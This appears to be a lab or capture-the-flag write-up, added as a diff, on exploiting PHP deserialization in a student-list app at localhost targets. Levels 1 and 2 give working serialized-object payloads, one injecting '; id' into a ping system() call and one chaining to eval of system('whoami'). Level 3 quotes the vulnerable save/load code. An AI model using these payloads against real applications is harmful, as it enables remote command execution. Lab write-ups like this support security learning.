@@ -1,0 +1,172 @@
+      [LEVEL 1]-TARGET: http://localhost:25001
+
+        - in the router.php, we have:
+
+            ...
+            public function __toString()
+            {
+                return system("ping " . $this->host);
+            }
+            ...
+
+        - in the table.php
+
+        <?php 
+            foreach ($_SESSION["students"] as $idx => $student)      // foreach student => print out
+                echo <<<EOF
+                    <tr>
+                        <th scope="row">{$idx}</th>{$student}
+                    </tr>
+                EOF;
+        ?>
+
+        * {$idx} separate with {$student} by '|', if you don't do that, the code will think our payload is {$idx} and __toString() can't be activated.
+
+        => 0|O:6:"Router":1:{s:4:"host";s:4:"; id";}
+        
+        *BOOM* uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+      [LEVEL 2]-TARGET: http://localhost:25002
+
+        - In the index.php:
+
+          foreach (glob("libs/*.php") as $filename) {
+            if ($filename !== "libs/router.php")
+                include($filename);
+          }
+
+          => we can't use router.php like previous level because this isn't include router.php
+
+          - And in the student.php, we have:
+
+            class Student
+            {
+                public $name;
+                public $age;
+                public $exam;
+                public function __construct($name, $age)
+                {
+                    $this->name = $name;
+                    $this->age = $age;
+                }
+                    public function __toString()
+                {
+                    return "<td>{$this->name}</td><td>{$this->age}</td><td>{$this->get_point()}</td>";  
+                }
+                ...
+                public function get_point()
+                {
+                    if (isset($this->exam))
+                        return $this->exam->get_result();
+                    return "N/A";
+                }
+            }
+
+          - It will collab with Calculator in utils.php:
+
+              class Calculator
+            {
+                public $expression;
+                public function __construct($expr)
+                {
+                    $this->expression = $expr;
+                }
+
+                public function get_result()
+                {
+                    $result = eval($this->expression);
+                    return $result;
+                }
+            }
+
+          => we will use get_result() funtion in Calculator
+
+          - And you have to fix a little to make it work:
+
+            <?php
+
+            class Calculator
+            {
+                public $expression;
+                public function __construct($expr)
+                {
+                    $this->expression = $expr;
+                }
+
+                public function get_result()
+                {
+                    $result = eval($this->expression);
+                    return $result;
+                }
+            }
+
+            class Exam{...}
+
+            class Student
+            {
+
+                public $name;
+                public $age;
+                public $exam;
+                public function __construct($name, $age, $exam)
+                {
+                    $this->name = $name;
+                    $this->age = $age;
+                    $this->exam = $exam;
+                }
+
+                public function __toString()
+                {
+                    return "<td>{$this->name}</td><td>{$this->age}</td><td>{$this->get_point()}</td>";
+                }
+                ...
+                public function get_point()
+                {
+                    if (isset($this->exam))
+                        return $this->exam->get_result();
+                    return "N/A";
+                }
+            }
+
+            $step1 = new Calculator("system('whoami');");
+            $step2 = new Student("name","age",$step1);
+            $payload = serialize($step2);
+            echo $payload;
+
+            => After that we got this: O:7:"Student":3:{s:4:"name";s:4:"name";s:3:"age";s:3:"age";s:4:"exam";O:10:"Calculator":1:{s:10:"expression";s:17:"system('whoami');";}}
+
+            - But there are sthg wrong here! Yes, we miss the id in the front, let complete it:
+                0|O:7:"Student":3:{s:4:"name";s:4:"name";s:3:"age";s:3:"age";s:4:"exam";O:10:"Calculator":1:{s:10:"expression";s:17:"system('whoami');";}}|
+
+            => Successful
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+        [LEVEL 3]-TARGET: http://localhost:25003
+
+          - safe-save-load.php file:
+
+              ...
+
+            foreach ($_SESSION["students"] as $key => $student)
+                $message = $message . $key . "|" . serialize($student) . "|";
+            file_put_contents("/usr/save_files/" . session_id(), $message);
+            echo "Saved";
+
+            ...
+
+            $data = file_get_contents("/usr/save_files/" . session_id());
+            $students_data = explode("|", $data);
+            $students = array();
+            for ($idx = 0; $idx < count($students_data); $idx = $idx + 2) {
+                $key = $students_data[$idx];
+                $value = $students_data[$idx + 1];
+                $value = unserialize($value);
+                $students[$key] = $value;
+                $_SESSION["students"] = $students;
+            }
+            echo "Loaded";
+
+            ... 
